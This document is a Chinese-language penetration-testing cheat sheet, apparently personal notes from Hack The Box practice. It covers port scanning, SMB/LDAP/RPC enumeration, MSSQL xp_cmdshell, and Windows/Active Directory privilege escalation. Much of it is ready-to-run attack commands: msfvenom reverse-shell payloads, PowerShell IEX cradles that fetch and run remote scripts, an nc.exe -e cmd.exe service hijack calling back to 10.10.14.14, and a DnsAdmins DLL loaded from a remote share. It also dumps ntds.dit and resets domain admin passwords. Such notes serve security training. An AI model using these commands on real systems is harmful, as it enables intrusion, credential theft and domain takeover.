[TOC]

https://github.com/bfengj/Pentest_Project

https://book.hacktricks.xyz/v/cn/

https://swisskyrepo.github.io/PayloadsAllTheThingsWeb

## nmap

```shell
sudo nmap -sS -T4 172.31.1.68 -p0-1000 （也可以加-Pn： 禁用PING检测）
nmap 172.16.8.3-255
sudo nmap -sS -T4 -sV --script vulners 10.10.11.227

sudo nmap -p 445 --script=vuln 10.10.10.4

#似乎不全
sudo nmap -T4 -A -v 10.10.10.3
-A：一次扫描包含系统探测、版本探测、脚本扫描和跟踪扫描

#其他的形式
#first
sudo nmap -p- --min-rate 10000 10.10.10.175
#then
sudo nmap -p 53,80,88,135,139,389,445,464,593,636,5985,9389 -sC -sV  10.10.10.175

sudo proxychains4  nmap -p1-10000  -sT -Pn   192.168.20.26


#爆破mysql
nmap -Pn -p3306 --script=mysql-brute --script-args brute.delay=10,brute.mode=creds,brute.credfile=mysql-creds.txt exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
```



| 端口号      | 端口说明               | 攻击技巧                                                     |
| ----------- | ---------------------- | ------------------------------------------------------------ |
| 21/22/69    | ftp/tftp：文件传输协议 | 爆破\嗅探\溢出\后门                                          |
| 22          | ssh：远程连接          | 爆破OpenSSH；28个退格                                        |
| 23          | telnet：远程连接       | 爆破\嗅探                                                    |
| 25          | smtp：邮件服务         | 邮件伪造                                                     |
| 53          | DNS：域名系统          | DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙 |
| 67/68       | dhcp                   | 劫持\欺骗                                                    |
| 110         | pop3                   | 爆破                                                         |
| 139         | samba                  | 爆破\未授权访问\远程代码执行                                 |
| 143         | imap                   | 爆破                                                         |
| 161         | snmp                   | 爆破                                                         |
| 389         | ldap                   | 注入攻击\未授权访问                                          |
| 512/513/514 | linux r                | 直接使用rlogin                                               |
| 873         | rsync                  | 未授权访问                                                   |
| 1080        | socket                 | 爆破：进行内网渗透                                           |
| 1352        | lotus                  | 爆破：弱口令\信息泄漏：源代码                                |
| 1433        | mssql                  | 爆破：使用系统用户登录\注入攻击                              |
| 1521        | oracle                 | 爆破：TNS\注入攻击                                           |
| 2049        | nfs                    | 配置不当                                                     |
| 2379        | K8s-etcd               | 未授权                                                       |
| 2181        | zookeeper              | 未授权访问                                                   |
| 3306        | mysql                  | 爆破\拒绝服务\注入                                           |
| 3389        | rdp                    | 爆破\Shift后门                                               |
| 4848        | glassfish              | 爆破：控制台弱口令\认证绕过                                  |
| 5000        | sybase/DB2             | 爆破\注入                                                    |
| 5432        | postgresql             | 缓冲区溢出\注入攻击\爆破：弱口令                             |
| 5632        | pcanywhere             | 拒绝服务\代码执行                                            |
| 5900        | vnc                    | 爆破：弱口令\认证绕过                                        |
| 6379        | redis                  | 未授权访问\爆破：弱口令                                      |
| 7001        | weblogic               | Java反序列化\控制台弱口令\控制台部署webshell                 |
| 80/443/8080 | web                    | 常见web攻击\控制台爆破\对应服务器版本漏洞                    |
| 8069        | zabbix                 | 远程命令执行                                                 |
| 9090        | websphere控制台        | 爆破：控制台弱口令\Java反序列                                |
| 9200/9300   | elasticsearch          | 远程代码执行                                                 |
| 11211       | memcacache             | 未授权访问                                                   |
| 27017       | mongodb                | 爆破\未授权访问                                              |

## fscan

```bash
fscan -h xxx
#有时候要用-np，即不通过ping来探测ip是否存活，因为对方可能不应答ping。
./fscan_amd64 -h 192.168.52.20/24 -nobr -nopoc -np

```





```bash
  -c string
        ssh命令执行
  -cookie string
        设置cookie
  -debug int
        多久没响应,就打印当前进度(default 60)
  -domain string
        smb爆破模块时,设置域名
  -h string
        目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
  -hf string
        读取文件中的目标
  -hn string
        扫描时,要跳过的ip: -hn 192.168.1.1/24
  -m string
        设置扫描模式: -m ssh (default "all")
  -no
        扫描结果不保存到文件中
  -nobr
        跳过sql、ftp、ssh等的密码爆破
  -nopoc
        跳过web poc扫描
  -np
        跳过存活探测
  -num int
        web poc 发包速率  (default 20)
  -o string
        扫描结果保存到哪 (default "result.txt")
  -p string
        设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
  -pa string
        新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)
  -path string
        fcgi、smb romote file path
  -ping
        使用ping代替icmp进行存活探测
  -pn string
        扫描时要跳过的端口,as: -pn 445
  -pocname string
        指定web poc的模糊名字, -pocname weblogic
  -proxy string
        设置代理, -proxy http://127.0.0.1:8080
  -user string
        指定爆破时的用户名
  -userf string
        指定爆破时的用户名文件
  -pwd string
        指定爆破时的密码
  -pwdf string
        指定爆破时的密码文件
  -rf string
        指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)
  -rs string
        redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)
  -silent
        静默扫描,适合cs扫描时不回显
  -sshkey string
        ssh连接时,指定ssh私钥
  -t int
        扫描线程 (default 600)
  -time int
        端口扫描超时时间 (default 3)
  -u string
        指定Url扫描
  -uf string
        指定Url文件扫描
  -wt int
        web访问超时时间 (default 5)
  -pocpath string
        指定poc路径
  -usera string
        在原有用户字典基础上,新增新用户
  -pwda string
        在原有密码字典基础上,增加新密码
  -socks5
        指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)
  -sc 
        指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)
```



## trufflehog

一款密钥查找工具。

对每种data都有不同的字命令：

- git
- github
- gitlab
- docker
- S3
- filesystem (files and directories)
- syslog
- circleci
- GCS (Google Cloud Storage)
- stdin (coming soon)

## searchsploit

```shell
Usage: searchsploit [options] term1 [term2] ... [termN]
 
==========
 Examples
==========
  searchsploit afd windows local
  searchsploit -t oracle windows
  searchsploit -p 39446
  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
 
  For more examples, see the manual: https://www.exploit-db.com/searchsploit/
 
=========
 Options
=========
   -c, --case     [Term]      区分大小写(默认不区分大小写)
   -e, --exact    [Term]      对exploit标题进行EXACT匹配 (默认为 AND) [Implies "-t"].
   -h, --help                 显示帮助
   -j, --json     [Term]      以JSON格式显示结果
   -m, --mirror   [EDB-ID]    把一个exp拷贝到当前工作目录,参数后加目标id
   -o, --overflow [Term]      Exploit标题被允许溢出其列
   -p, --path     [EDB-ID]    显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号
   -t, --title    [Term]      仅仅搜索漏洞标题（默认是标题和文件的路径）
   -u, --update               检查并安装任何exploitdb软件包更新（deb或git）
   -w, --www      [Term]      显示Exploit-DB.com的URL而不是本地路径（在线搜索）
   -x, --examine  [EDB-ID]    使用$ PAGER检查（副本）Exp
       --colour               搜索结果不高亮显示关键词
       --id                   显示EDB-ID
       --nmap     [file.xml]  使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）
                                使用“-v”（详细）来尝试更多的组合
       --exclude="term"       从结果中删除值。通过使用“|”分隔多个值
                              例如--exclude=“term1 | term2 | term3”。
 
=======
 Notes
=======
 * 你可以使用任意数量的搜索词。
 * Search terms are not case-sensitive (by default), and ordering is irrelevant.
   * 搜索术语不区分大小写(默认情况下)，而排序则无关紧要。
   * 如果你想用精确的匹配来过滤结果，请使用用 -e 参数
 * 使用' - t '将文件的路径排除，以过滤搜索结果
   * 删除误报(特别是在搜索使用数字时 - i.e. 版本).
 * 当更新或显示帮助时，搜索项将被忽略。
```

## Metasploit



```shell
search
set
exploit
show options
check
```

创建马：

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=39502 -f aspx > msfshell.asp

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=39502 -f exe > '/Users/feng/many-ctf/Ma!/msfshell.exe'

msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.14 lport=39502 -f hta-psh -o msfv.hta

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=39502 -f dll > msf-reverse-shell-39502.dll
```

```shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.28
set lport 39502
exploit
访问传上去的木马即可
```



使用代理：

```bash
setg Proxies socks5:127.0.0.1:37600
set ReverseAllowProxy true
```



提权建议脚本：

```shell
post/multi/recon/local_exploit_suggester
```

## 内网穿透

### Frp

服务端

```shell
[common]
# frp监听的端口，默认是7000，可以改成其他的
bind_port = 37000
# 授权码，请改成更复杂的
#token = 52010  # 这个token之后在客户端会用到

# frp管理后台端口，请按自己需求更改
dashboard_port = 37500
# frp管理后台用户名和密码，请改成自己的
dashboard_user = feng
dashboard_pwd = feng
enable_prometheus = true
```

客户端：

```shell
[common]
server_addr = 121.5.169.223
server_port = 37000

[windows]
type = tcp
#local_ip = 10.10.10.103
#local_port = 88
remote_port = 37600
plugin = socks5
```





```shell
./frps -c frps.ini
.\frpc.exe -c frpc.ini
```

代理需要用`proxychains4`，配置文件修改命令：`sudo vi /etc/proxychains.conf`



### NPS

TODO





## SMTP

25端口

枚举用户名：

```shell
use auxiliary/scanner/smtp/smtp_enum
setg RHOSTS  10.10.10.179
set USER_FILE /Users/feng/many-ctf/my-fuzz-wordlist/username/xato-net-10-million-usernames.txt
exploit
```







## SMB

1、端口445：SMB协议的主要通信端口。在现代版本的Windows操作系统中，SMB协议的通信主要通过TCP/IP协议在端口445上进行。端口445上的SMB通信提供了更高的安全性和功能，包括对加密和身份验证的支持。

2、端口139：早期版本的SMB协议通常在端口139上进行通信。它是NetBIOS Session Service的默认端口，用于在Windows网络上建立会话和进行文件共享。但是，端口139上的SMB通信缺乏加密和身份验证的支持，存在安全风险。因此，在现代网络环境中，推荐使用端口445进行SMB通信。

利用：https://www.freebuf.com/articles/web/318970.html

### smbmap

SMBMap允许用户枚举整个域中的samba共享驱动器。用户可以使用该工具列出共享驱动器、驱动器权限、共享内容、上传/下载功能、文件名自动下载模式匹配，甚至远程执行命令。该工具原本的设计初衷是为了简化在大型网络中搜索潜在敏感数据的过程。

```shell
smbmap -H <目标IP/主机名> -u <用户名> -p <密码>
```



不指定用户的时候是以NULL会话连接，并且我们不会得到任何返回，因为在现代版本的WindowsServer上默认情况下通常不会启用此功能。但是，如果您给它一个无效的用户名，而不指定密码，它将使用访客会话连接到机器。在这种情况下，访客会话会列出机器上的共享。

```shell
smbmap -u guest -H <目标IP/主机名>
```



### smbclient

尝试Anonymous用户登陆：

```shell
smbclient -N -L //10.10.10.175/
```





```shell
smbclient //192.168.0.100/share -U "xx"
```

进入smb之后类似于ftp

```shell
命令 说明 
?或help [command] 提供关于帮助或某个命令的帮助 
![shell command]   执行所用的SHELL命令，或让用户进入 SHELL提示符 
cd [目录]  切换到服务器端的指定目录，如未指定，则 smbclient 返回当前本地目录 
lcd [目录]  切换到客户端指定的目录； 
dir 或ls   列出当前目录下的文件； 
exit 或quit    退出smbclient 
get file1  file2 从服务器上下载file1，并以文件名file2存在本地机上；如果不想改名，可以把file2省略 
mget file1 file2 file3  filen 从服务器上下载多个文件； 
md或mkdir 目录 在服务器上创建目录 
rd或rmdir 目录 删除服务器上的目录 
put file1 [file2] 向服务器上传一个文件file1,传到服务器上改名为file2； 
mput file1 file2 filen 向服务器上传多个文件 
```

文件太多的时候递归下载：

```shell
smb: \active.htb\> RECURSE ON
smb: \active.htb\> PROMPT OFF
smb: \active.htb\> mget *
```

### crackmapexec

不支持mac arm，放到了docker里。

```shell
crackmapexec smb 10.10.10.192 -u "" -p "" --shares

#多用户名和密码时测试是否可连
./cme-linux smb 10.10.10.179 -u user.txt -p pass.txt --continue-on-success

```



## FTP

```shell
put
get

```

## 53端口 DNS

### 域传输漏洞

DNS Zone Transfers（DNS区域传输）是指一台备用服务器使用主服务器的数据来刷新自己的域数据库，其目的是为了防止主域名服务器因意外故障尔影响到整个域名的解析。当主服务器出现故障时，备用服务器就会顶替主服务器而提供域名解析服务。当DNS服务器被错误设置成只要有client发出请求，就会向对方提供一个z域数据库的详细信息时，就产生了DNS域传送漏洞。通过该漏洞，测试人员可以快速收集某个特定域信息，主机信息。

```shell
dig axfr @10.10.10.175 sauna.htb
dig axfr @10.10.10.175 egotistical-bank.local
```



## 135端口rpc

rpcclient文档：https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html

```shell
#使用空身份验证连接。空身份验证有助于在使用时枚举域和用户，这是 Windows Server 2003 和 2008 中的一项功能。在以后的版本中，它在进行全新安装时被删除。从以前版本的 Windows Server 升级时，该功能不会被禁用，因为用户可能正在使用此功能。
#-N即no pass
rpcclient -U "" -N 10.10.10.161
rpcclient -U "support" //10.10.10.192
```



```shell
#枚举用户
rpcclient $> enumdomusers
#列出组
rpcclient $> enumdomgroups
#Enumerate privileges
rpcclient $> enumprivs
#显示用户列表和描述
rpcclient $> querydispinfo
```



**通过rpc重置用户密码**：https://room362.com/post/2017/reset-ad-user-password-with-linux/

AdminCount = 1是域管理员和其他高权限帐户，而这里的23来源于UserInternal4Information = 23。

```shell
rpcclient $> setuserinfo2 audit2020 23 'feng123!'
```



## 389端口 LDAP



ldapsearch工具的参数：

```
Option	说明
-H	ldapuri，格式为ldap://机器名或者IP:端口号，不能与-h和-p同时使用
-h	LDAP服务器IP或者可解析的hostname，与-p可结合使用，不能与-H同时使用
-p	LDAP服务器端口号，与-h可结合使用，不能与-H同时使用
-x	使用简单认证方式
-D	所绑定的服务器的DN
-w	绑定DN的密码，与-W二者选一
-W	不输入密码，会交互式的提示用户输入密码，与-w二者选一
-f	指定输入条件，在RFC 4515中有更详细的说明
-c	出错后忽略当前错误继续执行，缺省情况下遇到错误即终止
-n	模拟操作但并不实际执行，用于验证，常与-v一同使用进行问题定位
-v	显示详细信息
-d	显示debug信息，可设定级别
-s	指定搜索范围, 可选值：base|one|sub|children
```



用户枚举：

```shell
ldapsearch -x -b "DC=htb,DC=local"  -s base -h 10.10.10.161

#-s base会少很多信息
ldapsearch -x -b "DC=htb,DC=local"  -h 10.10.10.161

#最好保存起来，因为信息太多终端显示不完
ldapsearch -x -b "dc=cascade,dc=local"   -h 10.10.10.182 > /Users/feng/github/CTF/Web/渗透/hackthebox/Cascade/ldapsearchresult.txt

#查询用户相关
ldapsearch -x -h 10.10.10.182  -b "dc=cascade,dc=local" '(objectClass=person)'
```



```shell
nmap --script "ldap*" -p 389 10.10.10.175
```

## 3690 SVN服务器

```shell
#下载到本地
svn checkout svn://10.10.10.203
#查看版本更迭
svn log
#更改版本到r1
snv up -r1
```



## Web

### 扫描

dirsearch等。

aquatone是一种对大量主机上的网站进行可视化检查的工具，可以方便地快速了解基于 HTTP 的攻击面。

### IIS

https://www.freebuf.com/articles/web/271930.html

常见的解析漏洞和一些文件上传漏洞拿脚本一键打即可。

IIS还有一个短文件名泄漏漏洞：https://www.freebuf.com/news/197144.html，利用工具：IIS_shortname_Scanner



上传文件中可以上传web.config，与apache上传.htaccess有异曲同工之妙：https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/

### tomcat

#### 后台用户名密码爆破

用户名密码爆破：msf的`scanner/http/tomcat_mgr_login`模块

## 数据库

### oracle-1521端口

1521端口

https://loong716.top/posts/Oracle_Database_Security/

normal 、sysdba、 sysoper有什么区别

normal是普通用户（system用户只能用normal身份登陆）

sysdba不是权限，sysdba拥有最高的系统权限，当用户以SYSDBA身份登陆数据库时，登陆用户都会变成sys。

sysoper身份主要用来启动、关闭数据库，sysoper登陆后用户是public



![请添加图片描述](README.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAb3JlMA==,size_20,color_FFFFFF,t_70,g_se,x_16.jpeg)

利用工具：ODAT(Oracle Database Attacking Tool)

用docker在本地安装了ODAT。

爆破SID：

```shell
python odat.py sidguesser -s 10.10.10.82 -p 1521
```

爆破用户名密码：

```shell
python odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file accounts/accounts.txt
```

accounts目录下还有别的txt。

传马：

```shell
python odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger --putFile 'c:\\Windows\\Temp' msfshell.exe  /root/htb/msfshell.exe --sysdba
```

`--sysdba`可以以sysdba的身份操控

执行文件：

```shell
python odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger --putFile 'c:\\Windows\\Temp' msfshell.exe  /root/htb/msfshell.exe --sysdba
```

### MSSQL-1433端口

具体参考https://www.freebuf.com/vuls/276814.html，下面没有列全。

#### 基本语句

```mssql
exec xp_dirtree 'c:'        // 列出所有c:\文件、目录、子目录
exec xp_dirtree 'c:',1      // 只列c:\目录
exec xp_dirtree 'c:',1,1    // 列c:\目录、文件
exec xp_subdirs 'C:';       // 只列c:\目录

exists(select * from sysobjects)//判断是否为mssql
select is_srvrolemember('sysadmin') #判断是否是系统管理员 
select is_srvrolemember('db_owner') //判断是否是库权限 
select is_srvrolemember('public')   //判断是否为public权限
select db_name()//查看当前数据库
select @@version

//查询所有数据库
SELECT  Name FROM Master..SysDatabases where name not in ('master','aspcms');
//查询数据库中的所有表
select name from 数据库名.sys.all_objects where type='U' AND is_ms_shipped=0

//查询表的列
select COLUMN_NAME from 数据库名.information_schema.columns where TABLE_NAME='表名'

//如果要跨库查询
select * from 库名.dbo.表名

//查看xp_cmdshell的状态
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'

//开启xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE

//一些用xp_cmdshell执行命令的例子：
exec xp_cmdshell "whoami"
master..xp_cmdshell 'whoami'    //2008版上好像用不了
EXEC master..xp_cmdshell "whoami"
EXEC master.dbo.xp_cmdshell "ipconfig"


//常见存储过程
xp_cmdshell         执行系统命令
xp_fileexist        确定一个文件是否存在。
xp_getfiledetails   获得文件详细资料。
xp_dirtree          展开你需要了解的目录，获得所有目录深度。
Xp_getnetname       获得服务器名称。

注册表访问的存储过程
Xp_regwrite
Xp_regread
Xp_regdeletekey
Xp_regaddmultistring
Xp_regdeletevalue
Xp_regenumvalues
Xp_regremovemultistring

OLE自动存储过程
Sp_OACreate Sp_OADestroy Sp_OAGetErrorInfo Sp_OAGetProperty
Sp_OAMethod Sp_OASetProperty Sp_OAStop  
```







#### 枚举域账户

https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/

https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/

https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/

https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/





```mssql
--查询MSSQL域名 
SELECT DEFAULT_DOMAIN() --得到MEGACORP

--获取域管理员RID
select SUSER_SID('MEGACORP\Domain Admins')
--十六进制编码
select master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')) --得到0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000
--抓去前48个字节得到域的SID：
--0105000000000005150000001c00d1bcd181f1492bdfc236

--然后递增枚举RID，域的RID从500开始，500的十六进制是01F4，然后反转成F401，然后补零 F4010000，即RID:0x0105000000000005150000001c00d1bcd181f1492bdfc236F4010000

--然后枚举用户
select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236F4010000) --得到MEGACORP\\Administrator
--递增枚举，即可。
```



## 域渗透

### 命令

#### 一般命令

```shell
#等同于curl
wget -qO- http://www.baidu.com

#用户权限
whoami /priv
#所属组
whoami /groups
#所有
whoami /all
#文件系统权限相关
#查看目录和文件的权限
icacls root.txt

#列出所有目录包括隐藏目录
dir -force
#显示文件的备用数据流。
dir /R
#读取流
more < c:\users\administrator\desktop\hm.txt:root.txt:$DATA
powershell Get-Content -Path "hm.txt" -Stream "root.txt"

ls -force #powershell中


#列出当前所有连接
netstat -a
#只列出tcp或udp
netstat -at
netstat -au
#-n 禁用域名解析功能
#-l 选项列出正在监听的套接字
#-p 选项查看进程信息
netstat -ap tcp
netstat -ltpe

#查看Administrator文件夹的权限
icacls Administrator

#获得域的信息
Get-ADDomain
```



#### net

```shell
#查看用户信息
net user svc_backup /domain

#修改administrator密码为feng123!
net user administrator feng123! /domain

#查看组信息
net group "domain admins" /domain
#将hack用户添加到domain admins组中
net group "domain admins" hack /add /domain


net config workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
net user                 # 查看本机用户列表
net user /domain         # 查看域用户
net localgroup administrators   # 查看本地管理员组（通常会有域用户）
net view /domain         # 查看有几个域
net user 用户名 /domain   # 获取指定域用户的信息
net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
net group 组名 /domain    # 查看域中某工作组
net group "domain admins" /domain  # 查看域管理员的名字
net group "domain computers" /domain  # 查看域中的其他主机名
net group "domain controllers" /domain  # 查看域控制器（可能有多台）

```

#### Powershell

```shell
#获取计算机上安装的所有命令，包括 cmdlet、别名、函数、筛选器、脚本和应用程序。（计算机上可用命令较少的时候使用）
Get-Command

#即powershell的dir
Get-ChildItem
#查看ps语言模式
$ExecutionContext.SessionState.LanguageMode



#下载文件
iwr -uri  http://10.10.14.14:39554/PsBypassCLM.exe -outfile PsBypassCLM.exe

#变成完全语言模式，配合上面的PsBypassCLM.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.14 /rport=39502 c:\users\amanda\appdata\local\temp\PsBypassCLM.exe

#用IEX下载远程PS1脚本绕过权限执行
powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14:39554/powershell-reverse-shell-39502.ps1')


#cs powershell上线
powershell IEX ((new-object net.webclient).downloadstring('http://10.10.14.14:39557/a'))

#执行powershell代码，多个以;间隔
powershell -c ""

#解密PSCredential对象的密码
powershell -c "$Credential=Import-Clixml -Path .\cred.xml;Write-Host ($Credential.GetNetworkCredential() | Format-List -Force | Out-String)"

#修改用户密码
$cred = ConvertTo-SecureString "fengfeng123!@#" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred

#将用户添加到某个组
$cred = ConvertTo-SecureString "fengfeng123!@#" -AsPlainText -force
$CredNew = New-Object System.Management.Automation.PSCredential('HTB\claire', $cred)
Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Credential $CredNew



#远程连接，mac上需要使用命令pwsh来打开powershell
$password = convertto-securestring -AsPlainText -Force -String 'UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!'
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "Administrator",$password
Enter-PSSession -ComputerName 44.204.191.38 -Credential $credential
```

### 提权



C:\windows\system32\spool\drivers\color\目录

#### 补丁信息

根据补丁信息查询exp：https://i.hacking8.com/tiquan/

#### msf提权建议

或者msf的提权建议：`post/multi/recon/local_exploit_suggester`

#### windows-exploit-suggester.py

或者利用windows-exploit-suggester.py来获取可用的提权exp：

```shell
python2 windows-exploit-suggester.py --database 2023-09-12-mssb.xls --systeminfo systeminfo.txt
```

#### WHP

或者使用https://github.com/51x/WHP，里面写了在没有补丁的情况下windows的内核漏洞。

#### winPEAS提权信息

还可以使用PEAS-ng中的winPEAS提权辅助脚本：

```shell
quiet              不打印banner
notcolor           不使用ansi颜色(全白)
domain             枚举域信息
systeminfo         查询系统信息
userinfo           查询用户信息
processinfo        查询进程信息
servicesinfo       查询服务信息
applicationsinfo   查询已安装的应用程序信息
networkinfo        查询网络信息
windowscreds       搜索Windows凭据
browserinfo        搜索浏览器信息
filesinfo          搜索可能包含凭据的通用文件
fileanalysis       搜索可能包含凭据的特定文件
eventsinfo         显示感兴趣的事件信息
wait               在两次检查之间等待用户输入
debug              显示调试信息-内存使用情况，方法执行时间
log[=logfile]      记录所有输出到定义为logfile的文件，如果未指定则记录到"out.txt"

额外的检查(慢):

-lolbas            运行额外的LOLBAS检查
-linpeas=[url]     运行额外的linpeas.sh检查默认的WSL分发，也可以选择提供定制的linpeas.sh url(默认值:https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)


#不指定类型将默认进行所有类型的检查。
.\winPEASx64.exe log=result.txt
```



但是因为winPEAS需要ANSI编码，mac上打不开，所以最好用notcolor，但是这样还是会有乱码。

```shell
.\winPEASx64.exe notcolor log=result.txt
```

#### PrivescCheck

此脚本旨在枚举可用于本地权限升级的**常见 Windows 配置问题。**它还收集可能对**利用**和/或**后利用有用的****各种信息**

```shell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
#扩展模式
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
```



#### PowerSploit

一款基于PowerShell的后渗透框架软件，包含了很多的Powershell攻击脚本。

##### PowerView.ps1

TODO



##### PowerUp.ps1

PowerUp.ps1脚本是 Privsec 目录下的一个脚本，功能非常强大。拥有很多用来寻找目标主机Windows服务配置错误来进行提权的模块。当我们无法通过 windows 内核漏洞进行提权的话，这个时候我们就可以利用该脚本来寻找目标主机上Windows服务配置错误来进行提权，或者利用常见的系统服务，通过其继承的系统权限来完成提权。



#### WIndows权限提权

https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8







#### 组提权

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges



##### Backup Operator组提权

拿到Backup Operator组成员的权限可以提权：https://github.com/mpgn/BackupOperatorToDA（mac好像用不了）



也可以用https://github.com/giuliano108/SeBackupPrivilege，但是只能实现读取文件似乎。

可以读取ntds.dit，这是DC上保存所有密码哈希值的数据库。

```shell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc_backup\Documents> import-module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
Opening input file. - The process cannot access the file because it is being used by another process. (Exception from HRESULT: 0x80070020)
At line:1 char:1
+ Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception
    + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege
```

如果因为它正在被使用无法读取，就需要使用diskshadow。



写一个script.txt

```shell
set context persistent nowriters
set metadata c:\windows\temp\df.cab
set verbose on
add volume c: alias someAlias
create
expose %someAlias% z:
```

非windows上需要转换一下：

```shell
unix2dos script.txt
unix2dos: converting file script.txt to DOS format...
```

上传过去之后执行：

```shell
diskshadow.exe /s .\script.txt
```

然后读取：

```shell
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit  C:\Users\svc_backup\Documents\ntds.dit
```

```shell
reg.exe save hklm\system C:\Users\svc_backup\Documents\system.bak
download ntds.dit
download system.bak
```



##### DnsAdmins组提权

参考：https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2

生成dll：

```shell
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=39502 -f dll > shell-reverse-39502.dll
```

触发：

```shell
dnscmd  /config /serverlevelplugindll \\10.10.14.14\share\shell-reverse-39502.dll
sc.exe stop dns
sc.exe start dns
```

可以反弹shell，也可以直接修改Administrator的密码：

```shell
msfvenom -p windows/x64/exec cmd='net user administrator feng123! /domain' -f dll > da.dll
```





##### AD Recycle Bin

https://petri.com/active-directory-recycle-bin/

https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/

这个组可以恢复被删除的对象，也可以获取被删除对象的信息。

```shell
#列出被删除的对象
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
#获取对象的信息
Get-ADObject -filter 'ObjectGUID -eq "f0cc344d-31e0-4866-bceb-a842791ca059"' -includeDeletedObjects -Properties *

#下面的也可以
Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
#恢复的命令没试过

Get-ADObject -Filter {displayName -eq “Peter Cetera”} -IncludeDeletedObjects | Restore-ADObject
```





##### Server Operators组

可利用的有很多：

> This membership allows users to configure Domain Controllers with the following privileges:
>
> - Allow log on locally
> - Back up files and directories
> - SeBackupPrivilege and SeRestorePrivilege
> - Change the system time
> - Change the time zone
> - Force shutdown from a remote system
> - Restore files and directories
> - Shut down the system
> - control local services

control local services的利用方法，参考https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/

```shell
upload nc.exe
sc.exe config VMTools binPath="C:\Users\jorden\Documents\nc.exe -e cmd.exe 10.10.14.14 39502"
sc.exe stop VMTools
sc.exe start VMTools
```



SeBackupPrivilege and SeRestorePrivilege：可以用`robocopy /b`命令来读取敏感文件：

```shell
*Evil-WinRM* PS C:\Users\jorden\Documents> robocopy /b c:\users\administrator\desktop\ .\

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, September 21, 2023 12:14:58 AM
   Source : c:\users\administrator\desktop\
     Dest : C:\Users\jorden\Documents\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                   2	c:\users\administrator\desktop\
	*EXTRA Dir        -1	C:\Users\jorden\Documents\My Music\
